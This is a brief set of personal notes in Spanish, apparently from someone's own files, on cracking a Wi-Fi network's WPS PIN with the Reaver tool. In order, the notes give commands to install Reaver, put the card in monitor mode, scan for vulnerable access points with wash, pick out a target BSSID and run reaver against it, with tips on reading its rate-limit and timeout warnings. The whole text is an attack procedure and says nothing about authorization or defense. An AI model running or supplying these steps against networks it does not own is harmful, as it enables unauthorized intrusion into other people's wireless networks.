http://tools.kali.org/wireless-attacks/reaver

pacman -S reaver

http://lifehacker.com/5873407/how-to-crack-a-wi-fi-networks-wpa-password-with-reaver

airodump-ng wlo1
  mirar aircrack-ng.md para ver como poner la wifi en modo monitor

wash -i wlan0mon -c CANAL -C
 escanear redes vulnerables al ataque


iwlist wlo1 scan
apuntamos el bbsid


reaver -i wlo1mon -b 8D:AE:9D:65:1F:B2 -vv

Mirar los mensajes.
A lo mejor, tras dos o tres intentos, el programa se para porque el AP le limita el número de conex.
  [!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking

Si vemos muchos timeout tambien es posible que vaya mal.
  [!] WARNING: Receive timeout occurred

Cada rato saca estadísticas, con esto podemos ver cuanto va a tardar.
